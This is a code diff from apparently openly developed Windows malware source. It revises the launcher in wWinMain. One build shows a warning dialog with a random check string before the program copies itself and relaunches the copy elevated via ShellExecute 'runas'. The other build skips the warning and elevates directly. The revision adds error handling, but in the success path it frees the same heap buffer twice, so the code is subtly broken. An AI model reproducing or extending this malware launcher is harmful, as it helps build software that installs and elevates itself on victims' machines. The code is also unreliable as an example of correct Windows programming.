@@ -242,24 +242,37 @@ INT APIENTRY wWinMain(
 			}
 		}
 	} else {
-		// Ugly formating, sorry for that...
 #if WARNING == TRUE
 		// Warn User about the execution of the Malware
-		std::wstring szRCheck = fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN));
+		HANDLE hHeap = GetProcessHeap();
+		if (!hHeap) {
+			MessageBox(NULL, L"Couldn't get Handle to Process Heap", L"fnMessageHandlerW (GetProcessHeap)", MB_ICONERROR | MB_SYSTEMMODAL);
+			ExitProcess(EXIT_FAILURE);
+		}
+		std::wstring szRCheck = fnCryptGenRandomStringW(0x8);
+		SIZE_T ulHeap = ((lstrlen(szWarningMSG) * 2) + (lstrlen(szRCheck.c_str()) * 2));
 
-		LPVOID lpMessage = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (lstrlen(szWarningMSG) * 2));
-		if (SUCCEEDED(StringCchPrintf((LPWSTR)lpMessage, lstrlen(szWarningMSG), szWarningMSG, szRCheck.c_str()))) {
-			if (MessageBox(NULL, (LPCWSTR)lpMessage, szMALWR_NAME, MB_YESNO | MB_SYSTEMMODAL | MB_ICONWARNING) == IDYES) {
-				if (CreateFile(szRCheck.c_str(), GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL) != INVALID_HANDLE_VALUE) {
-					if (fnCopyFileW(szAdpn.c_str(), szAdfn.c_str())) {
-						ShellExecute(NULL, L"runas", szAdfn.c_str(), L"/host /init", szAdpn.c_str(), SW_SHOWDEFAULT);
+		LPVOID lpMessage = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, ulHeap);
+		if (lpMessage) {
+			if (SUCCEEDED(StringCbPrintf((LPWSTR)lpMessage, ulHeap, szWarningMSG, szRCheck.c_str()))) {
+				if (MessageBox(NULL, (LPCWSTR)lpMessage, szMALWR_NAME, MB_YESNO | MB_ICONWARNING | MB_SYSTEMMODAL) == IDYES) {
+					if (CreateFile(szRCheck.c_str(), GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL) != INVALID_HANDLE_VALUE) {
+						if (fnCopyFileW(szAdpn.c_str(), szAdfn.c_str())) {
+							ShellExecute(NULL, L"runas", szAdfn.c_str(), L"/host /init", szAdpn.c_str(), SW_SHOWDEFAULT);
+							HeapFree(hHeap, NULL, lpMessage);
+						}
 					} else {
-						LocalFree(szArglist);
-						ExitProcess(EXIT_FAILURE);
+						fnMESSAGEHANDLERW(NULL, L"Couldn't open Check-File", L"CreateFileW", MB_ICONERROR);
 					}
 				}
+			} else {
+				fnMESSAGEHANDLERW(NULL, L"Couldn't format Warning-Message", L"StringCbPrintf", MB_ICONERROR);
 			}
+		} else {
+			fnMESSAGEHANDLERW(NULL, L"Couldn't allocate Buffer in Heap", L"HeapAlloc", MB_ICONERROR);
 		}
+
+		HeapFree(hHeap, NULL, lpMessage);
 #else // WARNING
 		if (fnCopyFileW(szAdpn.c_str(), szAdfn.c_str(), szMfn)) {
 			ShellExecute(NULL, L"runas", szAdfn.c_str(), L"/host /init", szAdpn.c_str(), SW_SHOWDEFAULT);
